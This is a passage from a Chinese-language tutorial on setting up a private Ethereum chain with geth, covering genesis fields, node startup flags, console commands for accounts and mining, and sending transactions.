<span class="token property">"gasLimit"</span><span class="token operator">:</span> <span class="token string">"0xffffffff"</span><span class="token punctuation">,</span>  <span class="token comment">// 可选填的参数</span>  <span class="token property">"coinbase"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000"</span><span class="token punctuation">,</span>  <span class="token property">"extraData"</span><span class="token operator">:</span> <span class="token string">"0x00"</span><span class="token punctuation">,</span>  <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000001"</span><span class="token punctuation">,</span>  <span class="token property">"mixhash"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span>  <span class="token property">"parentHash"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span>  <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token string">"0x00"</span><span class="token punctuation">,</span>  <span class="token property">"alloc"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"430e986e0cca10a174baad96871ec9cb308c6d05"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"balance"</span><span class="token operator">:</span> <span class="token string">"111111"</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>各个字段解释如下：</p><table><thead><tr><th>必填</th><th></th></tr></thead><tbody><tr><td>chainId</td><td>自定义私链的网络ID，不同的网络ID无法互联通讯，以太坊公链ID 为1，我们设置为987以防止与网络中其他私链冲突。</td></tr><tr><td>homesteadBlock</td><td>是否为HomeStead版本的区块，设置为0表明是。</td></tr><tr><td>eip155Block</td><td>EIP155 [<a href="https://ethbook.abyteahead.com/ch5/build.html#id5">1]</a> 是一个以太坊分叉提议，为了和以前的以太坊经典ETC 链条分叉而存在，我们私链不需要它，设为0。</td></tr><tr><td>eip158Block</td><td>EIP158 [<a href="https://ethbook.abyteahead.com/ch5/build.html#id6">2]</a> 是一个以太坊分叉提议，为了解决之前以太坊空账户造成效率低下的协议漏洞而分叉，我们私链不需要它，设为0。</td></tr><tr><td>difficulty</td><td>设置当前区块难度，若难度过大挖矿就很慢，我们设置较小值。</td></tr><tr><td>gasLimit</td><td>单一区块最大 gas 消耗上限，用来限制能够打包进入块的交易数量与信息总和，我们在学习中可以设置为最大。</td></tr><tr><td>选填</td><td></td></tr><tr><td>coinbase</td><td>打包该块的矿工的奖励地址，因为是创世块，可设为0地址。</td></tr><tr><td>extraData</td><td>打包该块时矿工记录的笔记。</td></tr><tr><td>nonce</td><td>打包该块时矿工挖矿所用到的Ethash输入参数nonce。</td></tr><tr><td>mixHash</td><td>与nonce配合用于挖矿，创世区无前一个区块，可不填。</td></tr><tr><td>parentHash</td><td>前一个区块头的哈希值，创世区块无前一个区块，设为0。</td></tr><tr><td>timestamp</td><td>打包该块的时间戳，符合Unix Timestamp标准，设为0。</td></tr><tr><td>alloc</td><td>创世时各账户分配以太币的数量，不想分配则忽略。</td></tr></tbody></table><h3 id="2-2-初始化私链节点"><a href="#2-2-初始化私链节点" class="headerlink" title="2.2 初始化私链节点"></a>2.2 初始化私链节点</h3><p>执行 geth 的 init 命令初始化私链节点:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> .<span class="token punctuation">\</span>data init gensis.json<span class="token comment"># Successfully wrote genesis state</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这会在当前目录下创建 data 目录,用来保存区块数据及账户信息</p><p>可以上述命令写到一个脚本 <code>init.cmd</code> 里，文件内容如下:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> .<span class="token punctuation">\</span>data init gensis.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在部署下一个节点时,就可以直接执行这个脚本进行初始化了。例如,在另一台机器上:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">init.cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-3-启动私链节点"><a href="#2-3-启动私链节点" class="headerlink" title="2.3 启动私链节点"></a>2.3 启动私链节点</h3><p>在我们现在的环境下，需要启动一个 Geth 节点来接入私链网络（实际上也是这个私链网络的唯一一个节点），负责在创世块后挖出第一个块。该节点也是我们与以太坊私链通信的节点服务器。下面我们来启动这样一个节点。同样,你可以用一个脚本 <code>console.cmd</code> 来简化启动节点时的输入,文件内容如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> ./data ^<span class="token parameter variable">--rpc</span> <span class="token parameter variable">--rpcaddr</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">--rpcport</span> <span class="token number">8545</span> <span class="token parameter variable">--rpccorsdomain</span> <span class="token string">"*"</span> ^<span class="token parameter variable">--rpcapi</span> <span class="token string">"eth,net,web3,personal,admin,shh,txpool,debug,miner"</span> ^<span class="token parameter variable">--nodiscover</span> <span class="token parameter variable">--maxpeers</span> <span class="token number">30</span> <span class="token parameter variable">--networkid</span> <span class="token number">987</span> <span class="token parameter variable">--port</span> <span class="token number">30303</span> ^<span class="token parameter variable">--mine</span> <span class="token parameter variable">--minerthreads</span> <span class="token number">1</span> ^<span class="token parameter variable">--etherbase</span> <span class="token string">"0x7df9a875a174b3bc565e6424a0050ebc1b2d1d82"</span> console<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>geth启动时命令行参数解释如下表:</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–rpc</td><td>开启JSON-RPC 服务，可供调用/调试访问。</td></tr><tr><td>–rpcaddr</td><td>本地监听JSON-RPC的地址。</td></tr><tr><td>–rpcport</td><td>本地监听JSON-RPC的端口。</td></tr><tr><td>–prccorsdomain</td><td>本地监听JSON-RPC允许的域名访问。</td></tr><tr><td>–rpcapi</td><td>允许提供的RPC服务模块，在示例中选择了数个模块加载。</td></tr><tr><td>–nodiscover</td><td>关闭自动发现节点，私有链开发时防止他人意外接入，可选择关闭该选项避免他人加入网络。</td></tr><tr><td>–maxpeers</td><td>允许最大节点链接数目。</td></tr><tr><td>–networkid</td><td>指定以太坊网络ID。</td></tr><tr><td>–port</td><td>监听以太坊节点之间P2P消息的TCP/UDP端口，默认30303。</td></tr><tr><td>–mine</td><td>节点启动挖矿功能，参与挖矿。</td></tr><tr><td>–minerthreads</td><td>挖矿的多线程配置，例子中配置为1个线程。</td></tr><tr><td>–etherbase</td><td>若启动挖矿功能，挖矿奖励的接受地址，例子中我们随便填了一个。</td></tr><tr><td>console</td><td>(可选) 启动后进入命令行模式，直接输入命令互动操作。</td></tr></tbody></table><p>输入回车，启动成功！此时控制台会输出一组日志信息并有欢迎信息</p><p>以后启动节点,只要直接执行这个脚本即可:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">console.cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入控制台</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth attach http://127.0.0.1:8545<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Geth-启动结果解释"><a href="#Geth-启动结果解释" class="headerlink" title="Geth 启动结果解释"></a>Geth 启动结果解释</h4><ul><li><strong>数据目录</strong>：你指定了 <code>--datadir ./data</code>，Geth 会将所有区块链数据和配置文件存储在该目录中。</li><li><strong>RPC 服务</strong>：你启动了 HTTP-RPC 接口，监听地址为 <code>127.0.0.1</code>，端口为 <code>8545</code>。这意味着你可以通过 HTTP 方式与节点交互。</li><li><strong>挖矿</strong>：你启用了 <code>--mine</code> 参数，使用一个线程（<code>--minerthreads 1</code>）进行挖矿，挖矿奖励会发送到地址 <code>0x7df9a875a174b3bc565e6424a0050ebc1b2d1d82</code>。</li><li><strong>禁止节点发现</strong>：你启用了 <code>--nodiscover</code> 参数，这意味着节点不会自动发现和连接其他节点（适用于私有链）。</li></ul><h4 id="后续如何使用这些配置"><a href="#后续如何使用这些配置" class="headerlink" title="后续如何使用这些配置"></a>后续如何使用这些配置</h4><h5 id="进入控制台后："><a href="#进入控制台后：" class="headerlink" title="进入控制台后："></a>进入控制台后：</h5><p>你可以直接在 Geth 控制台中输入命令与节点交互。以下是一些常见的操作：</p><ul><li><p><strong>查看挖矿状态</strong>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span>hashrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会返回当前的挖矿算力。</p></li><li><p><strong>查看当前区块高度</strong>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>blockNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会显示当前节点已同步的最新区块号。</p></li><li><p><strong>查看账户余额</strong>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token string">"0x7df9a875a174b3bc565e6424a0050ebc1b2d1d82"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会显示指定账户的余额。</p></li><li><p><strong>停止挖矿</strong>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会停止挖矿进程。</p></li><li><p><strong>发送交易</strong>： 你可以使用 <code>eth.sendTransaction</code> 发送交易。例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">from</span><span class="token operator">:</span> <span class="token string">"0x7df9a875a174b3bc565e6424a0050ebc1b2d1d82"</span><span class="token punctuation">,</span> <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xRecipientAddress"</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>解锁账户</strong>： 如果要发送交易，首先需要解锁账户：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">unlockAccount</span><span class="token punctuation">(</span><span class="token string">"0x7df9a875a174b3bc565e6424a0050ebc1b2d1d82"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h5 id="使用-RPC-接口："><a href="#使用-RPC-接口：" class="headerlink" title="使用 RPC 接口："></a>使用 RPC 接口：</h5><p>你启动了 RPC 服务，这意味着你可以通过 HTTP 与节点交互，而不必进入控制台。可以使用 <code>curl</code>、Web3.js、Python 等工具来与节点通信。下面是几个例子：</p><ul><li><p><strong>使用 <code>curl</code> 查看区块高度</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">--data</span> <span class="token string">'{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}'</span> http://127.0.0.1:8545<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会返回当前的区块高度。</p></li><li><p><strong>使用 Web3.js 与节点交互</strong>： 你可以使用 Web3.js 编写一个简单的脚本来获取节点信息。例如，安装 Web3.js：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> web3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用以下 JavaScript 代码获取节点的区块高度：</p><pre class="line-numbers language-web-idl" data-language="web-idl"><code class="language-web-idl"><span class="token keyword">const</span> <span class="token class-name">Web3</span> <span class="token operator">=</span> require<span class="token punctuation">(</span>'web3'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token class-name">web3</span> <span class="token operator">=</span> <span class="token class-name">new</span> Web3<span class="token punctuation">(</span>'http<span class="token operator">:</span><span class="token comment">//127.0.0.1:8545');</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getBlockNumber<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>then<span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="手动添加其他节点："><a href="#手动添加其他节点：" class="headerlink" title="手动添加其他节点："></a>手动添加其他节点：</h5><p>如果你想手动连接其他节点，可以使用 <code>admin.addPeer</code> 命令。例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">admin<span class="token punctuation">.</span><span class="token function">addPeer</span><span class="token punctuation">(</span><span class="token string">"enode://publickey@ip:port"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将允许你将其他节点加入到网络中。</p><h3 id="2-4-账户管理"><a href="#2-4-账户管理" class="headerlink" title="2.4 账户管理"></a>2.4 账户管理</h3><h4 id="2-4-1-查看账户列表"><a href="#2-4-1-查看账户列表" class="headerlink" title="2.4.1 查看账户列表"></a>2.4.1 查看账户列表</h4><p>在 geth 控制台,使用 eth 对象的 accounts 属性查看目前的账户列表:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> eth.accounts  or personal.listAccounts<span class="token punctuation">[</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-4-2-创建新账户"><a href="#2-4-2-创建新账户" class="headerlink" title="2.4.2 创建新账户"></a>2.4.2 创建新账户</h4><p>在 geth 控制台,使用 personal 对象的 newAccount()方法创建一个新账户,参数为你自己选择的密码:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> personal.newAccount<span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span>  <span class="token string">"0x6e1d438b00d5bb865c4d842e9c02549709130147"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出就是新创建的账户地址(公钥),你的输出不会和上面的示例相同。geth 会保存到数据目录下的 keystore 文件中。</p><h4 id="2-4-3-查询账户余额"><a href="#2-4-3-查询账户余额" class="headerlink" title="2.4.3 查询账户余额"></a>2.4.3 查询账户余额</h4><p>在 geth 控制台,使用 personal 对象的 getBalance()方法获取挃定账户的余额,参数为账户地址:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> eth.getBalance<span class="token punctuation">(</span>eth.accounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  或者直接输入账户地址:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> eth.getBalance<span class="token punctuation">(</span><span class="token string">'0xd8bcf1324d566cbec5d3b67e6e14485b06a41d49'</span><span class="token punctuation">)</span>  <span class="token number">0</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">web3.fromWei<span class="token punctuation">(</span>eth.getBalance<span class="token punctuation">(</span>eth.accounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token comment"># 将wei换算成eth</span>web3.toWei<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-4-4-挖矿"><a href="#2-4-4-挖矿" class="headerlink" title="2.4.4 挖矿"></a>2.4.4 挖矿</h4><p>私有链不用其他节点也能挖矿</p><h5 id="1-启动和停止挖矿"><a href="#1-启动和停止挖矿" class="headerlink" title="1. 启动和停止挖矿"></a>1. <strong>启动和停止挖矿</strong></h5><h6 id="启动挖矿"><a href="#启动挖矿" class="headerlink" title="启动挖矿"></a>启动挖矿</h6><p>要开始挖矿，你可以使用以下命令：</p><pre class="line-numbers language-none"><code class="language-none">miner.start(threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>threads参数表示使用多少个线程进行挖矿。比如要用 1 个线程：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="停止挖矿"><a href="#停止挖矿" class="headerlink" title="停止挖矿"></a>停止挖矿</h6><p>要停止挖矿，可以使用以下命令：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-查看挖矿状态"><a href="#2-查看挖矿状态" class="headerlink" title="2. 查看挖矿状态"></a>2. <strong>查看挖矿状态</strong></h5><h6 id="查看挖矿是否正在进行"><a href="#查看挖矿是否正在进行" class="headerlink" title="查看挖矿是否正在进行"></a>查看挖矿是否正在进行</h6><p>你可以通过以下命令检查节点当前是否正在挖矿：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>mining<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>这个命令返回 <code>true</code> 表示节点正在挖矿，返回 <code>false</code> 表示节点没有在挖矿。</li></ul><h6 id="查看当前的哈希算力"><a href="#查看当前的哈希算力" class="headerlink" title="查看当前的哈希算力"></a>查看当前的哈希算力</h6><p>使用以下命令查看节点的哈希算力：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span>hashrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>返回的数值表示每秒计算的哈希数，以 H/s（哈希每秒）为单位。</li></ul><h6 id="查看矿工账户"><a href="#查看矿工账户" class="headerlink" title="查看矿工账户"></a>查看矿工账户</h6><p>使用以下命令查看当前挖矿收益的账户（即矿工地址）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>coinbase<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="查看当前区块高度"><a href="#查看当前区块高度" class="headerlink" title="查看当前区块高度"></a>查看当前区块高度</h6><p>你可以通过以下命令查看节点同步到的最新区块高度：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>blockNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-设置矿工账户"><a href="#3-设置矿工账户" class="headerlink" title="3. 设置矿工账户"></a>3. <strong>设置矿工账户</strong></h5><p>在挖矿前，通常需要设置 <code>coinbase</code>（即矿工账户地址），挖矿的奖励会发送到这个地址。你可以使用以下命令设置 <code>coinbase</code>：</p><h6 id="设置矿工账户"><a href="#设置矿工账户" class="headerlink" title="设置矿工账户"></a>设置矿工账户</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">setEtherbase</span><span class="token punctuation">(</span><span class="token string">"0xYourAccountAddress"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>这个命令将指定的账户设置为矿工账户。</li></ul><h5 id="4-挖矿奖励和账户"><a href="#4-挖矿奖励和账户" class="headerlink" title="4. 挖矿奖励和账户"></a>4. <strong>挖矿奖励和账户</strong></h5><h6 id="查看当前账户的余额"><a href="#查看当前账户的余额" class="headerlink" title="查看当前账户的余额"></a>查看当前账户的余额</h6><p>要查看矿工账户的余额，可以使用以下命令：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span>eth<span class="token punctuation">.</span>coinbase<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="解锁矿工账户"><a href="#解锁矿工账户" class="headerlink" title="解锁矿工账户"></a>解锁矿工账户</h6><p>如果你希望自动将矿工奖励发送到某个账户，你可能需要解锁该账户，尤其是在你打算用这个账户发送交易时：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">unlockAccount</span><span class="token punctuation">(</span>eth<span class="token punctuation">.</span>coinbase<span class="token punctuation">,</span> <span class="token string">"yourpassword"</span><span class="token punctuation">,</span> duration<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>duration</code> 是账户解锁的时间，单位是秒。</li></ul><h5 id="5-与挖矿相关的高级操作"><a href="#5-与挖矿相关的高级操作" class="headerlink" title="5. 与挖矿相关的高级操作"></a>5. <strong>与挖矿相关的高级操作</strong></h5><h6 id="设置挖矿目标难度"><a href="#设置挖矿目标难度" class="headerlink" title="设置挖矿目标难度"></a>设置挖矿目标难度</h6><p>在私有链上，你可以通过修改 <code>genesis.json</code> 文件中的 <code>difficulty</code> 值来控制挖矿难度。在 Geth 运行期间，无法直接修改目标难度。</p><h6 id="查看挖到的区块"><a href="#查看挖到的区块" class="headerlink" title="查看挖到的区块"></a>查看挖到的区块</h6><p>使用以下命令可以查看最新的区块信息：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getBlock</span><span class="token punctuation">(</span><span class="token string">'latest'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>eth.getBlock()</code> 返回的区块信息包含以下常见字段：</p><ul><li><code>number</code>: 区块号</li><li><code>hash</code>: 区块的哈希值</li><li><code>parentHash</code>: 父区块的哈希</li><li><code>nonce</code>: 区块中工作量证明的 nonce 值</li><li><code>miner</code>: 挖出该区块的矿工地址</li><li><code>difficulty</code>: 区块的挖矿难度</li><li><code>totalDifficulty</code>: 该区块链上到当前区块为止的总难度</li><li><code>size</code>: 区块大小（以字节为单位）</li><li><code>gasLimit</code>: 该区块的 gas 上限</li><li><code>gasUsed</code>: 该区块使用的 gas</li><li><code>timestamp</code>: 区块的时间戳</li><li><code>transactions</code>: 包含在该区块中的交易数组</li><li><code>uncles</code>: 包含该区块的叔块数组</li></ul><h6 id="自动挖矿新交易"><a href="#自动挖矿新交易" class="headerlink" title="自动挖矿新交易"></a>自动挖矿新交易</h6><p>Geth 提供一个选项可以在有新交易进入交易池时自动开始挖矿：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">setAuto</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>设置为 <code>1</code> 后，每当交易池中有新交易时，节点将自动开始挖矿。</li></ul><h5 id="6-挖矿的调试工具"><a href="#6-挖矿的调试工具" class="headerlink" title="6. 挖矿的调试工具"></a>6. <strong>挖矿的调试工具</strong></h5><h6 id="查看交易池中的交易"><a href="#查看交易池中的交易" class="headerlink" title="查看交易池中的交易"></a>查看交易池中的交易</h6><p>如果你想查看待处理的交易，可以使用以下命令：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">txpool<span class="token punctuation">.</span>status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>返回的信息会告诉你有多少笔交易在交易池中等待执行。</li></ul><h6 id="查看挖矿日志"><a href="#查看挖矿日志" class="headerlink" title="查看挖矿日志"></a>查看挖矿日志</h6><p>挖矿日志可以帮助你跟踪挖矿状态和进度。在 Geth 启动时，你可以通过设置日志等级来查看挖矿详细信息。例如，使用 <code>--verbosity</code> 参数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">geth <span class="token operator">--</span>verbosity <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样，挖矿时的日志会显示更多详细的挖矿信息。</p><h5 id="7-挖矿常见问题"><a href="#7-挖矿常见问题" class="headerlink" title="7. 挖矿常见问题"></a>7. <strong>挖矿常见问题</strong></h5><ul><li><p><strong>无法开始挖矿？</strong> 如果你无法开始挖矿，可能是由于账户未解锁。确保你已解锁矿工账户：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">unlockAccount</span><span class="token punctuation">(</span>eth<span class="token punctuation">.</span>coinbase<span class="token punctuation">,</span> <span class="token string">"yourpassword"</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>矿工奖励没有到账？</strong> 矿工奖励发放需要时间，尤其是在主网上挖矿时，奖励只有在挖到的区块被确认后才能到账。</p></li></ul><h5 id="8-挖矿命令汇总"><a href="#8-挖矿命令汇总" class="headerlink" title="8. 挖矿命令汇总"></a>8. <strong>挖矿命令汇总</strong></h5><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><code>miner.start(threads)</code></td><td>启动挖矿，<code>threads</code> 为使用的线程数</td></tr><tr><td><code>miner.stop()</code></td><td>停止挖矿</td></tr><tr><td><code>miner.hashrate</code></td><td>查看当前的挖矿算力</td></tr><tr><td><code>eth.mining</code></td><td>查看是否正在挖矿</td></tr><tr><td><code>miner.setEtherbase("address")</code></td><td>设置矿工账户</td></tr><tr><td><code>eth.getBalance(eth.coinbase)</code></td><td>查看矿工账户的余额</td></tr><tr><td><code>eth.blockNumber</code></td><td>查看当前区块高度</td></tr><tr><td><code>eth.getBlock('latest')</code></td><td>查看最新的区块信息</td></tr><tr><td><code>txpool.status</code></td><td>查看交易池中的待处理交易</td></tr><tr><td><code>personal.unlockAccount(eth.coinbase, "password", 600)</code></td><td>解锁矿工账户</td></tr></tbody></table><h4 id="2-4-5-解锁账户"><a href="#2-4-5-解锁账户" class="headerlink" title="2.4.5 解锁账户"></a>2.4.5 解锁账户</h4><p>在部署合约时需要一个解锁的账户。</p><p>在 geth 控制台使用 <code>personal</code> 对象的 <code>unlockAccount()</code>  方法来解锁挃定的账户,参数为账户地址和账户密码(在创建账户时挃定的那个密码):  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> eth.unlockAccount<span class="token punctuation">(</span>eth.accounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span>  <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-5-交易"><a href="#2-5-交易" class="headerlink" title="2.5 交易"></a>2.5 交易</h3><h4 id="1-发送交易"><a href="#1-发送交易" class="headerlink" title="1. 发送交易"></a>1. <strong>发送交易</strong></h4><h5 id="使用-eth-sendTransaction-发送交易"><a href="#使用-eth-sendTransaction-发送交易" class="headerlink" title="使用 eth.sendTransaction 发送交易"></a>使用 <code>eth.sendTransaction</code> 发送交易</h5><p>发送交易时，你可以使用 <code>eth.sendTransaction</code> 命令。示例如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token literal-property property">from</span><span class="token operator">:</span> <span class="token string">"0xSenderAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xRecipientAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>from</code>: 发送者账户的地址，必须先解锁账户。</li><li><code>to</code>: 接收者账户的地址。</li><li><code>value</code>: 发送的金额，单位是 wei（可以使用 <code>web3.toWei</code> 转换成 ether）。</li><li><code>gas</code>: （可选）指定交易的 gas 上限，默认为 <code>21000</code>，适用于普通转账。</li><li><code>gasPrice</code>: （可选）指定每单位 gas 的价格，默认为当前网络的 gas 价格。</li><li><code>data</code>: （可选）包含用于合约调用的数据（智能合约交易时用到）。</li></ul><h5 id="解锁账户"><a href="#解锁账户" class="headerlink" title="解锁账户"></a>解锁账户</h5><p>在发送交易前，如果账户被锁定，你需要解锁账户：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">unlockAccount</span><span class="token punctuation">(</span><span class="token string">"0xSenderAddress"</span><span 